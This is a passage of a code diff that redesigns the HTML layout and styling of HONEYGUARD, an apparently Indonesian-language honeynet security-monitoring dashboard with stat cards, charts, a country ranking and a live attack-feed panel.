@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Honeynet Security Operations Center (SOC) Dashboard</title>
+    <title>Honeynet SOC Glass Dashboard</title>
     
     <!-- CDN Dependencies -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -13,14 +13,14 @@
             theme: {
                 extend: {
                     colors: {
-                        cyber: {
-                            dark: '#0b0f19',
-                            cardDark: 'rgba(17, 24, 39, 0.75)',
-                            cardLight: 'rgba(255, 255, 255, 0.85)',
-                            accentBlue: '#38bdf8',
-                            accentPurple: '#818cf8',
-                            accentRed: '#f43f5e',
-                            accentGreen: '#10b981'
+                        brand: {
+                            purple: '#8b5cf6',
+                            purpleDark: '#6d28d9',
+                            orange: '#f97316',
+                            cyan: '#06b6d4',
+                            magenta: '#d946ef',
+                            bgDark: '#0e0c1f',
+                            bgLight: '#f3f4f9'
                         }
                     }
                 }
@@ -28,9 +28,9 @@
         }
     </script>
     
-    <!-- Icons & Font -->
+    <!-- Icons & Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
     <!-- Leaflet CSS & JS -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -47,503 +47,594 @@
     <style>
         body {
             font-family: 'Plus Jakarta Sans', sans-serif;
-            transition: background-color 0.3s, color 0.3s;
+            transition: background-color 0.4s ease, color 0.4s ease;
         }
 
-        /* Modern Glassmorphism Styling */
-        .glass-card {
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.12);
+        /* Ambient Glassmorphism Styling */
+        .glass-panel {
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            transition: background 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
         }
-        .light .glass-card {
+
+        html.dark .glass-panel {
+            background: rgba(24, 20, 50, 0.65);
+            border: 1px solid rgba(139, 92, 246, 0.18);
+            box-shadow: 0 15px 35px -5px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.08);
+        }
+
+        html:not(.dark) .glass-panel {
             background: rgba(255, 255, 255, 0.75);
-            border: 1px solid rgba(226, 232, 240, 0.8);
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.04), 0 8px 10px -6px rgba(0, 0, 0, 0.04);
-        }
-        .dark .glass-card {
-            background: rgba(15, 23, 42, 0.75);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.9);
+            box-shadow: 0 15px 35px -5px rgba(124, 58, 237, 0.08), inset 0 1px 0 rgba(255, 255, 255, 1);
         }
 
-        /* Custom Scrollbar */
+        /* Glass Input Fields */
+        .glass-input {
+            transition: all 0.2s ease;
+        }
+        html.dark .glass-input {
+            background: rgba(15, 12, 35, 0.7);
+            border: 1px solid rgba(139, 92, 246, 0.25);
+            color: #f1f5f9;
+        }
+        html:not(.dark) .glass-input {
+            background: rgba(245, 246, 252, 0.9);
+            border: 1px solid rgba(203, 213, 225, 0.8);
+            color: #1e293b;
+        }
+
+        /* Scrollbar Customization */
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(156, 163, 175, 0.4); border-radius: 4px; }
-        ::-webkit-scrollbar-thumb:hover { background: rgba(156, 163, 175, 0.7); }
+        ::-webkit-scrollbar-thumb { background: rgba(139, 92, 246, 0.3); border-radius: 99px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(139, 92, 246, 0.6); }
 
-        /* Leaflet Map Customization */
         .leaflet-container { background: transparent !important; }
-        
-        /* Attack Arc pulse animation */
-        @keyframes pulse-red {
-            0% { r: 3px; opacity: 1; }
-            100% { r: 15px; opacity: 0; }
-        }
     </style>
 </head>
 
-<body class="bg-slate-900 text-slate-100 min-h-screen flex flex-col antialiased selection:bg-cyan-500 selection:text-white">
+<body class="bg-brand-bgLight dark:bg-brand-bgDark text-slate-800 dark:text-slate-100 min-h-screen flex flex-col md:flex-row antialiased relative overflow-x-hidden">
 
-    <!-- TOP HEADER NAVBAR -->
-    <header class="sticky top-0 z-50 glass-card border-b px-4 py-3 flex items-center justify-between">
-        <div class="flex items-center space-x-3">
-            <div class="p-2 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-xl text-white shadow-lg shadow-cyan-500/30">
-                <i class="fa-solid font-bold fa-shield-halved text-xl"></i>
-            </div>
-            <div>
-                <h1 class="font-bold text-lg leading-tight tracking-wide bg-gradient-to-r from-cyan-400 to-blue-500 bg-clip-text text-transparent">HONEYGUARD SOC</h1>
-                <p class="text-xs text-slate-400 font-medium">Sistem Monitoring & Intelligence Honeynet</p>
-            </div>
-        </div>
+    <!-- Glowing Ambient Backdrop Elements -->
+    <div class="fixed inset-0 pointer-events-none overflow-hidden z-0">
+        <div class="absolute -top-40 -left-40 w-96 h-96 bg-purple-600/25 dark:bg-purple-900/35 rounded-full blur-3xl animate-pulse"></div>
+        <div class="absolute top-1/3 -right-40 w-96 h-96 bg-cyan-500/20 dark:bg-indigo-900/30 rounded-full blur-3xl"></div>
+        <div class="absolute -bottom-40 left-1/3 w-96 h-96 bg-rose-500/20 dark:bg-purple-950/40 rounded-full blur-3xl"></div>
+    </div>
 
-        <!-- Global Timeline & Options -->
-        <div class="flex items-center space-x-3">
-            <div class="hidden md:flex items-center bg-slate-800/80 dark:bg-slate-800/80 light:bg-slate-200 rounded-lg p-1 border border-slate-700/50">
-                <i class="fa-regular fa-clock text-slate-400 text-xs ml-2 mr-1"></i>
-                <select id="globalTimeline" onchange="onGlobalTimelineChange()" class="bg-transparent text-xs font-semibold text-slate-200 focus:outline-none cursor-pointer py-1 pr-2">
-                    <option value="1h" class="bg-slate-800 text-white">1 Jam Terakhir</option>
-                    <option value="24h" class="bg-slate-800 text-white">24 Jam Terakhir</option>
-                    <option value="7d" class="bg-slate-800 text-white">7 Hari Terakhir</option>
-                    <option value="30d" selected class="bg-slate-800 text-white">30 Hari Terakhir</option>
-                </select>
-            </div>
-
-            <!-- Dark / Light Theme Toggle -->
-            <button onclick="toggleTheme()" class="p-2.5 rounded-xl glass-card text-slate-300 hover:text-white transition duration-200 hover:bg-slate-800/60" title="Ubah Tema">
-                <i id="themeIcon" class="fa-solid fa-moon"></i>
-            </button>
-        </div>
-    </header>
-
-    <!-- NAVIGATION BAR (DESKTOP) -->
-    <nav class="hidden md:flex justify-center space-x-2 py-2 px-4 glass-card border-b border-slate-800/60 sticky top-[61px] z-40 bg-slate-900/60">
-        <button onclick="switchTab('dashboard')" id="nav-dashboard" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition flex items-center space-x-2 text-cyan-400 bg-slate-800/80">
-            <i class="fa-solid fa-chart-pie"></i><span>Dashboard</span>
-        </button>
-        <button onclick="switchTab('threatmap')" id="nav-threatmap" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition flex items-center space-x-2 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40">
-            <i class="fa-solid fa-earth-americas"></i><span>Threat Map</span>
-        </button>
-        <button onclick="switchTab('analisis')" id="nav-analisis" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition flex items-center space-x-2 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40">
-            <i class="fa-solid fa-file-contract"></i><span>Analisis & Laporan</span>
-        </button>
-        <button onclick="switchTab('log')" id="nav-log" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition flex items-center space-x-2 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40">
-            <i class="fa-solid fa-list-check"></i><span>Log Honeypot</span>
-        </button>
-        <button onclick="switchTab('ai')" id="nav-ai" class="tab-btn px-4 py-2 rounded-lg text-sm font-semibold transition flex items-center space-x-2 text-slate-400 hover:text-slate-200 hover:bg-slate-800/40">
-            <i class="fa-solid fa-brain"></i><span>AI Analyst</span>
-        </button>
-    </nav>
-
-    <!-- MAIN CONTENT CONTAINER -->
-    <main class="flex-1 p-4 md:p-6 max-w-7xl mx-auto w-full mb-16 md:mb-0">
-        
-        <!-- 1. DASHBOARD TAB -->
-        <section id="tab-dashboard" class="tab-content space-y-6">
+    <!-- LEFT SIDEBAR NAVIGATION (DESKTOP) -->
+    <aside class="hidden md:flex flex-col w-64 p-5 z-40 relative flex-shrink-0">
+        <div class="glass-panel h-full rounded-3xl p-5 flex flex-col justify-between">
             
-            <!-- Key Metric Cards -->
-            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
-                <div class="glass-card rounded-2xl p-5 flex items-center justify-between">
-                    <div>
-                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Serangan Siber</p>
-                        <h3 id="cardTotalCyber" class="text-2xl font-bold mt-1 text-slate-100">0</h3>
-                        <span class="text-xs text-cyan-400 flex items-center mt-1"><i class="fa-solid fa-bolt mr-1"></i> Terdeteksi dalam rentang</span>
+            <!-- Logo Section -->
+            <div class="space-y-6">
+                <div class="flex items-center space-x-3 px-2">
+                    <div class="w-10 h-10 rounded-2xl bg-gradient-to-tr from-purple-600 to-pink-500 flex items-center justify-center text-white shadow-lg shadow-purple-500/30">
+                        <i class="fa-solid fa-shield-halved text-lg"></i>
                     </div>
-                    <div class="p-3 bg-cyan-500/10 text-cyan-400 rounded-xl">
-                        <i class="fa-solid fa-shield-virus text-2xl"></i>
+                    <div>
+                        <h1 class="font-extrabold text-base tracking-wider bg-gradient-to-r from-purple-500 via-pink-500 to-rose-500 bg-clip-text text-transparent">HONEYGUARD</h1>
+                        <p class="text-[10px] text-slate-400 font-semibold tracking-widest uppercase">SOC Analytics</p>
                     </div>
                 </div>
 
-                <div class="glass-card rounded-2xl p-5 flex items-center justify-between">
-                    <div>
-                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Serangan Malware</p>
-                        <h3 id="cardTotalMalware" class="text-2xl font-bold mt-1 text-slate-100">0</h3>
-                        <span class="text-xs text-rose-400 flex items-center mt-1"><i class="fa-solid fa-bug mr-1"></i> Dropper & C2 Callbacks</span>
-                    </div>
-                    <div class="p-3 bg-rose-500/10 text-rose-400 rounded-xl">
-                        <i class="fa-solid fa-bug text-2xl"></i>
-                    </div>
-                </div>
-
-                <div class="glass-card rounded-2xl p-5 flex items-center justify-between">
-                    <div>
-                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Negara Penyerang Teratas</p>
-                        <h3 id="cardTopCountry" class="text-xl font-bold mt-1 text-slate-100">-</h3>
-                        <span id="cardTopCountryCount" class="text-xs text-slate-400 mt-1 block">0 Log Total</span>
-                    </div>
-                    <div class="p-3 bg-purple-500/10 text-purple-400 rounded-xl">
-                        <i class="fa-solid fa-globe text-2xl"></i>
-                    </div>
-                </div>
-
-                <div class="glass-card rounded-2xl p-5 flex items-center justify-between">
-                    <div>
-                        <p class="text-xs font-medium text-slate-400 uppercase tracking-wider">Titik Honeypot Aktif</p>
-                        <h3 id="cardActiveNodes" class="text-2xl font-bold mt-1 text-slate-100">4 Node</h3>
-                        <span class="text-xs text-emerald-400 flex items-center mt-1"><i class="fa-solid fa-circle-check mr-1"></i> Semua Sensor Normal</span>
-                    </div>
-                    <div class="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl">
-                        <i class="fa-solid fa-server text-2xl"></i>
-                    </div>
-                </div>
+                <!-- Navigation Links -->
+                <nav class="space-y-1.5">
+                    <button onclick="switchTab('dashboard')" id="nav-dashboard" class="tab-btn w-full px-4 py-3 rounded-2xl text-xs font-bold transition flex items-center space-x-3 bg-gradient-to-r from-purple-600 to-indigo-600 text-white shadow-lg shadow-purple-600/30">
+                        <i class="fa-solid fa-chart-pie text-sm"></i><span>Dashboard</span>
+                    </button>
+                    <button onclick="switchTab('threatmap')" id="nav-threatmap" class="tab-btn w-full px-4 py-3 rounded-2xl text-xs font-semibold transition flex items-center space-x-3 text-slate-500 dark:text-slate-400 hover:text-purple-600 dark:hover:text-purple-400 hover:bg-purple-500/10">
+                        <i class="fa-solid fa-earth-americas text-sm"></i><span>Threat Map</span>
+                    </button>
+                    <button onclick="switchTab('analisis')" id="nav-analisis" class="tab-btn w-full px-4 py-3 rounded-2xl text-xs font-semibold transition flex items-center space-x-3 text-slate-500 dark:text-slate-400 hover:text-purple-600 dark:hover:text-purple-400 hover:bg-purple-500/10">
+                        <i class="fa-solid fa-file-contract text-sm"></i><span>Analisis & Laporan</span>
+                    </button>
+                    <button onclick="switchTab('log')" id="nav-log" class="tab-btn w-full px-4 py-3 rounded-2xl text-xs font-semibold transition flex items-center space-x-3 text-slate-500 dark:text-slate-400 hover:text-purple-600 dark:hover:text-purple-400 hover:bg-purple-500/10">
+                        <i class="fa-solid fa-list-check text-sm"></i><span>Log Honeypot</span>
+                    </button>
+                    <button onclick="switchTab('ai')" id="nav-ai" class="tab-btn w-full px-4 py-3 rounded-2xl text-xs font-semibold transition flex items-center space-x-3 text-slate-500 dark:text-slate-400 hover:text-purple-600 dark:hover:text-purple-400 hover:bg-purple-500/10">
+                        <i class="fa-solid fa-brain text-sm"></i><span>AI Analyst</span>
+                    </button>
+                </nav>
             </div>
 
-            <!-- Charts Section -->
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                <!-- Timeline Chart -->
-                <div class="lg:col-span-2 glass-card rounded-2xl p-5 flex flex-col justify-between">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-slate-200 text-sm flex items-center">
-                            <i class="fa-solid fa-chart-line text-cyan-400 mr-2"></i> Tren Aktivitas Serangan (Siber vs Malware)
-                        </h3>
-                    </div>
-                    <div class="h-64 relative w-full">
-                        <canvas id="chartTimeline"></canvas>
-                    </div>
-                </div>
-
-                <!-- Attack Type Distribution -->
-                <div class="glass-card rounded-2xl p-5 flex flex-col justify-between">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-slate-200 text-sm flex items-center">
-                            <i class="fa-solid fa-chart-pie text-purple-400 mr-2"></i> Distribusi Tipe Serangan
-                        </h3>
-                    </div>
-                    <div class="h-64 relative flex items-center justify-center">
-                        <canvas id="chartTypes"></canvas>
-                    </div>
-                </div>
+            <!-- Bottom Menu Items -->
+            <div class="pt-6 border-t border-slate-200 dark:border-slate-800/80 space-y-1.5">
+                <button class="w-full px-4 py-2.5 rounded-2xl text-xs font-semibold text-slate-500 dark:text-slate-400 hover:bg-slate-200/50 dark:hover:bg-slate-800/50 flex items-center space-x-3 transition">
+                    <i class="fa-solid fa-gear text-sm"></i><span>Pengaturan</span>
+                </button>
+                <button class="w-full px-4 py-2.5 rounded-2xl text-xs font-semibold text-slate-500 dark:text-slate-400 hover:bg-slate-200/50 dark:hover:bg-slate-800/50 flex items-center space-x-3 transition">
+                    <i class="fa-solid fa-circle-question text-sm"></i><span>Bantuan</span>
+                </button>
             </div>
+        </div>
+    </aside>
 
-            <!-- Ranking & Live Log Stream -->
-            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                <!-- Top Attacking Countries Ranking -->
-                <div class="glass-card rounded-2xl p-5 flex flex-col">
-                    <h3 class="font-bold text-slate-200 text-sm mb-4 flex items-center">
-                        <i class="fa-solid fa-flag text-rose-400 mr-2"></i> Ranking Negara Asal Penyerang
-                    </h3>
-                    <div id="topCountriesList" class="space-y-3 flex-1 overflow-y-auto max-h-72 pr-1">
-                        <!-- Populated by JS -->
-                    </div>
-                </div>
+    <!-- MAIN CONTENT WRAPPER -->
+    <div class="flex-1 flex flex-col min-w-0 z-10 p-4 md:p-6 md:pl-0 space-y-6">
 
-                <!-- Live Attack Stream -->
-                <div class="lg:col-span-2 glass-card rounded-2xl p-5 flex flex-col">
-                    <div class="flex items-center justify-between mb-4">
-                        <h3 class="font-bold text-slate-200 text-sm flex items-center">
-                            <span class="relative flex h-3 w-3 mr-2">
-                              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
-                              <span class="relative inline-flex rounded-full h-3 w-3 bg-rose-500"></span>
-                            </span> Live Honeypot Attack Feed
-                        </h3>
-                        <button onclick="toggleLiveStream()" id="btnPauseStream" class="text-xs bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg border border-slate-700 text-slate-300 font-medium">
-                            <i class="fa-solid fa-pause mr-1"></i> Jeda
-                        </button>
-                    </div>
-                    <div id="liveStreamContainer" class="space-y-2 overflow-y-auto max-h-72 text-xs font-mono pr-2">
-                        <!-- Simulated Real-time Log Stream -->
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- 2. THREAT MAP TAB -->
-        <section id="tab-threatmap" class="tab-content hidden space-y-6">
-            <div class="glass-card rounded-2xl p-5 flex flex-wrap items-center justify-between gap-4">
-                <div>
-                    <h2 class="text-base font-bold text-slate-200">Peta Ancam Global Interaktif</h2>
-                    <p class="text-xs text-slate-400">Visualisasi Geografis Serangan Real-Time dari Sumber Penyerang ke Honeypot Sensor</p>
-                </div>
-                
-                <div class="flex items-center space-x-3">
-                    <span class="text-xs text-slate-400">Kategori Data:</span>
-                    <select id="mapCategoryFilter" onchange="renderMap()" class="bg-slate-800 border border-slate-700 text-xs rounded-lg px-3 py-1.5 text-slate-200">
-                        <option value="all">Semua Serangan</option>
-                        <option value="Siber">Hanya Serangan Siber</option>
-                        <option value="Malware">Hanya Serangan Malware</option>
+        <!-- TOP BAR HEADER -->
+        <header class="glass-panel rounded-3xl p-4 flex flex-wrap items-center justify-between gap-4">
+            <div class="flex items-center space-x-4">
+                <h2 id="pageTitle" class="text-xl font-extrabold tracking-tight text-slate-900 dark:text-white">Dashboard</h2>
+                <div class="hidden sm:flex items-center bg-slate-200/60 dark:bg-slate-800/60 rounded-xl px-3 py-1.5 border border-slate-300/40 dark:border-slate-700/40">
+                    <i class="fa-regular fa-clock text-purple-500 text-xs mr-2"></i>
+                    <select id="globalTimeline" onchange="onGlobalTimelineChange()" class="bg-transparent text-xs font-semibold text-slate-700 dark:text-slate-200 focus:outline-none cursor-pointer">
+                        <option value="1h" class="bg-white dark:bg-slate-900">1 Jam Terakhir</option>
+                        <option value="24h" class="bg-white dark:bg-slate-900">24 Jam Terakhir</option>
+                        <option value="7d" class="bg-white dark:bg-slate-900">7 Hari Terakhir</option>
+                        <option value="30d" selected class="bg-white dark:bg-slate-900">30 Hari Terakhir</option>
                     </select>
                 </div>
             </div>
 
-            <!-- Map Area -->
-            <div class="glass-card rounded-2xl p-2 relative overflow-hidden" style="height: 520px;">
-                <div id="honeynetMap" class="w-full h-full rounded-xl z-10"></div>
-                
-                <!-- Map Legend -->
-                <div class="absolute bottom-6 left-6 z-20 glass-card p-3 rounded-xl text-xs space-y-2 border border-slate-700/80 bg-slate-900/80">
-                    <div class="font-bold text-slate-200 mb-1">Keterangan Node</div>
-                    <div class="flex items-center space-x-2">
-                        <span class="w-3 h-3 rounded-full bg-cyan-400 inline-block shadow-lg shadow-cyan-500/50"></span>
-                        <span>Sensor Honeypot Target</span>
+            <!-- Actions Right -->
+            <div class="flex items-center space-x-3">
+                <!-- Search bar -->
+                <div class="relative hidden sm:block">
+                    <i class="fa-solid fa-magnifying-glass absolute left-3.5 top-2.5 text-xs text-slate-400"></i>
+                    <input type="text" placeholder="Cari IP atau log..." class="glass-input pl-9 pr-4 py-2 rounded-xl text-xs w-44 focus:w-60 transition-all focus:outline-none">
+                </div>
+
+                <!-- Dark/Light Mode Toggle -->
+                <button onclick="toggleTheme()" class="p-2.5 rounded-xl glass-panel text-slate-600 dark:text-slate-300 hover:text-purple-600 dark:hover:text-purple-400 transition" title="Ubah Tema">
+                    <i id="themeIcon" class="fa-solid fa-moon"></i>
+                </button>
+
+                <!-- Profile Badge -->
+                <div class="flex items-center space-x-3 pl-2 border-l border-slate-300 dark:border-slate-700">
+                    <div class="w-8 h-8 rounded-full bg-gradient-to-tr from-purple-500 to-indigo-500 flex items-center justify-center text-white text-xs font-bold shadow-md shadow-purple-500/20">
+                        DW
                     </div>
-                    <div class="flex items-center space-x-2">
-                        <span class="w-3 h-3 rounded-full bg-rose-500 inline-block"></span>
-                        <span>Sumber Serangan Siber</span>
-                    </div>
-                    <div class="flex items-center space-x-2">
-                        <span class="w-3 h-3 rounded-full bg-purple-500 inline-block"></span>
-                        <span>Sumber Serangan Malware</span>
+                    <div class="hidden lg:block text-left leading-tight">
+                        <p class="text-xs font-bold text-slate-800 dark:text-slate-100">Dimas Dwiki</p>
+                        <p class="text-[10px] text-slate-400">Cyber Security Spec</p>
                     </div>
                 </div>
             </div>
-        </section>
+        </header>
 
-        <!-- 3. ANALISIS DAN LAPORAN TAB -->
-        <section id="tab-analisis" class="tab-content hidden space-y-6">
-            <div class="glass-card rounded-2xl p-6 space-y-6">
-                <div>
-                    <h2 class="text-lg font-bold text-slate-100 flex items-center">
-                        <i class="fa-solid fa-file-invoice text-cyan-400 mr-2"></i> Generator Laporan Keamanan Honeynet
-                    </h2>
-                    <p class="text-xs text-slate-400 mt-1">Konfigurasi dan ekspor hasil analisis ancaman keamanan siber ke dokumen resmi PDF atau Word (.docx).</p>
-                </div>
+        <!-- DYNAMIC CONTENT CONTAINER -->
+        <main class="flex-1 space-y-6">
 
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 border-t border-b border-slate-800 py-6">
-                    <!-- Checkbox Section Selection -->
-                    <div class="space-y-3">
-                        <label class="block text-sm font-semibold text-slate-200">Komponen Laporan yang Dimuat:</label>
-                        <div class="space-y-2 text-xs text-slate-300">
-                            <label class="flex items-center space-x-2 cursor-pointer">
-                                <input type="checkbox" id="repIncSummary" checked class="rounded border-slate-700 text-cyan-500 focus:ring-0">
-                                <span>Ringkasan Eksekutif Metrik Utama</span>
-                            </label>
-                            <label class="flex items-center space-x-2 cursor-pointer">
-                                <input type="checkbox" id="repIncTimeline" checked class="rounded border-slate-700 text-cyan-500 focus:ring-0">
-                                <span>Analisis Tren Waktu Aktivitas Serangan</span>
-                            </label>
-                            <label class="flex items-center space-x-2 cursor-pointer">
-                                <input type="checkbox" id="repIncTypes" checked class="rounded border-slate-700 text-cyan-500 focus:ring-0">
-                                <span>Breakdown Distribusi Tipe Serangan</span>
-                            </label>
-                            <label class="flex items-center space-x-2 cursor-pointer">
-                                <input type="checkbox" id="repIncCountries" checked class="rounded border-slate-700 text-cyan-500 focus:ring-0">
-                                <span>Daftar 10 Negara Asal Penyerang Teratas</span>
-                            </label>
-                            <label class="flex items-center space-x-2 cursor-pointer">
-                                <input type="checkbox" id="repIncLogs" checked class="rounded border-slate-700 text-cyan-500 focus:ring-0">
-                                <span>Tabel Sampel Log Mentah Serangan Terkini</span>
-                            </label>
+            <!-- 1. DASHBOARD TAB -->
+            <section id="tab-dashboard" class="tab-content space-y-6">
+                
+                <!-- TOP STATS CARDS WITH SPARKLINE DESIGN -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+                    
+                    <!-- Card 1: Serangan Siber -->
+                    <div class="glass-panel rounded-3xl p-5 flex flex-col justify-between space-y-3 relative overflow-hidden group">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <p class="text-xs font-semibold text-slate-400">Serangan Siber</p>
+                                <h3 id="cardTotalCyber" class="text-2xl font-extrabold mt-1 text-slate-900 dark:text-white">0</h3>
+                            </div>
+                            <span class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-500 border border-amber-500/20">
+                                <i class="fa-solid fa-arrow-trend-up mr-1"></i>+12%
+                            </span>
+                        </div>
+                        <div class="h-10 w-full relative">
+                            <canvas id="sparklineCyber"></canvas>
                         </div>
                     </div>
 
-                    <!-- Template Customizer & Language -->
-                    <div class="space-y-4">
+                    <!-- Card 2: Serangan Malware -->
+                    <div class="glass-panel rounded-3xl p-5 flex flex-col justify-between space-y-3 relative overflow-hidden group">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <p class="text-xs font-semibold text-slate-400">Serangan Malware</p>
+                                <h3 id="cardTotalMalware" class="text-2xl font-extrabold mt-1 text-slate-900 dark:text-white">0</h3>
+                            </div>
+                            <span class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-500 border border-rose-500/20">
+                                <i class="fa-solid fa-arrow-trend-up mr-1"></i>+23%
+                            </span>
+                        </div>
+                        <div class="h-10 w-full relative">
+                            <canvas id="sparklineMalware"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- Card 3: Negara Teratas -->
+                    <div class="glass-panel rounded-3xl p-5 flex flex-col justify-between space-y-3 relative overflow-hidden group">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <p class="text-xs font-semibold text-slate-400">Asal Utama Penyerang</p>
+                                <h3 id="cardTopCountry" class="text-xl font-extrabold mt-1 text-slate-900 dark:text-white">-</h3>
+                            </div>
+                            <span class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-cyan-500/10 text-cyan-500 border border-cyan-500/20">
+                                Global
+                            </span>
+                        </div>
+                        <p id="cardTopCountryCount" class="text-xs text-slate-500 dark:text-slate-400 font-medium">0 Log Total</p>
+                    </div>
+
+                    <!-- Card 4: Sensor Status -->
+                    <div class="glass-panel rounded-3xl p-5 flex flex-col justify-between space-y-3 relative overflow-hidden group">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <p class="text-xs font-semibold text-slate-400">Honeypot Active Nodes</p>
+                                <h3 id="cardActiveNodes" class="text-2xl font-extrabold mt-1 text-slate-900 dark:text-white">4 Node</h3>
+                            </div>
+                            <span class="px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/10 text-emerald-500 border border-emerald-500/20">
+                                100% Online
+                            </span>
+                        </div>
+                        <div class="w-full bg-slate-200 dark:bg-slate-800 rounded-full h-2 overflow-hidden mt-2">
+                            <div class="bg-gradient-to-r from-emerald-500 to-cyan-500 h-full w-full rounded-full"></div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- MAIN CHARTS ROW -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    
+                    <!-- Line Chart: Tren Aktivitas -->
+                    <div class="lg:col-span-2 glass-panel rounded-3xl p-6 flex flex-col justify-between space-y-4">
+                        <div class="flex items-center justify-between">
+                            <div>
+                                <h3 class="font-extrabold text-sm text-slate-900 dark:text-white">Tren Aktivitas Serangan</h3>
+                                <p class="text-xs text-slate-400">Perbandingan harian Serangan Siber vs Malware</p>
+                            </div>
+                            <div class="flex items-center space-x-3 text-xs">
+                                <span class="flex items-center text-purple-500 font-medium"><span class="w-2.5 h-2.5 rounded-full bg-purple-500 mr-1.5"></span> Siber</span>
+                                <span class="flex items-center text-cyan-400 font-medium"><span class="w-2.5 h-2.5 rounded-full bg-cyan-400 mr-1.5"></span> Malware</span>
+                            </div>
+                        </div>
+                        <div class="h-64 relative w-full">
+                            <canvas id="chartTimeline"></canvas>
+                        </div>
+                    </div>
+
+                    <!-- Donut Chart: Distribusi Tipe Serangan -->
+                    <div class="glass-panel rounded-3xl p-6 flex flex-col justify-between space-y-4">
+                        <div class="flex items-center justify-between">
+                            <div>
+                                <h3 class="font-extrabold text-sm text-slate-900 dark:text-white">Distribusi Vektor Serangan</h3>
+                                <p class="text-xs text-slate-400">Kategori tipe eksploitasi</p>
+                            </div>
+                        </div>
+                        <div class="h-64 relative flex items-center justify-center">
+                            <canvas id="chartTypes"></canvas>
+                        </div>
+                    </div>
+
+                </div>
+
+                <!-- BOTTOM ROW: RANKING & LIVE FEED -->
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    
+                    <!-- Country Ranking -->
+                    <div class="glass-panel rounded-3xl p-6 flex flex-col justify-between space-y-4">
+                        <h3 class="font-extrabold text-sm text-slate-900 dark:text-white flex items-center">
+                            <i class="fa-solid fa-flag-checkered text-purple-500 mr-2"></i> Ranking Asal Penyerang
+                        </h3>
+                        <div id="topCountriesList" class="space-y-3.5 flex-1 overflow-y-auto max-h-72 pr-1">
+                            <!-- Populated JS -->
+                        </div>
+                    </div>
+
+                    <!-- Live Attack Feed Stream -->
+                    <div class="lg:col-span-2 glass-panel rounded-3xl p-6 flex flex-col justify-between space-y-4">
+                        <div class="flex items-center justify-between">
+                            <h3 class="font-extrabold text-sm text-slate-900 dark:text-white flex items-center">
+                                <span class="relative flex h-2.5 w-2.5 mr-2.5">
+                                  <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
+                                  <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-rose-500"></span>
+                                </span> Live Honeypot Attack Feed
+                            </h3>
+                            <button onclick="toggleLiveStream()" id="btnPauseStream" class="text-xs glass-input px-3 py-1.5 rounded-xl font-semibold hover:border-purple-500 transition">
+                                <i class="fa-solid fa-pause mr-1"></i> Jeda
+                            </button>
+                        </div>
+                        <div id="liveStreamContainer" class="space-y-2.5 overflow-y-auto max-h-72 text-xs font-mono pr-1">
+                            <!-- Live feed stream items -->
+                        </div>
+                    </div>
+
+                </div>
+            </section>
+
+            <!-- 2. THREAT MAP TAB -->
+            <section id="tab-threatmap" class="tab-content hidden space-y-6">
+                <div class="glass-panel rounded-3xl p-6 flex flex-wrap items-center justify-between gap-4">
+                    <div>
